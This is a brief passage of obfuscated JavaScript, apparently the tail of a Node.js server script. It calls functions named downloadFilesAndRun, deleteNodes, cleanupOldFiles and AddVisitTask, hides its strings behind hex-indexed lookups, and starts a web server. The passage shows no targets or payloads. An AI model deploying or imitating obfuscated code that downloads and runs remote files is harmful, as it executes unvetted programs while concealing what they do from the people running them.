_0x54625e=_0x203c67;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x46f12c){console[_0x54625e(0x19d)](_0x54625e(0x1e8),_0x46f12c);}}startserver()[_0x203c67(0x1bf)](_0x40ebbc=>{const _0x847f2f=_0x203c67;console[_0x847f2f(0x19d)](_0x847f2f(0x1ca),_0x40ebbc);}),app[_0x203c67(0x1ad)](PORT,()=>console[_0x203c67(0x1ff)](_0x203c67(0x19c)+PORT+'!'));
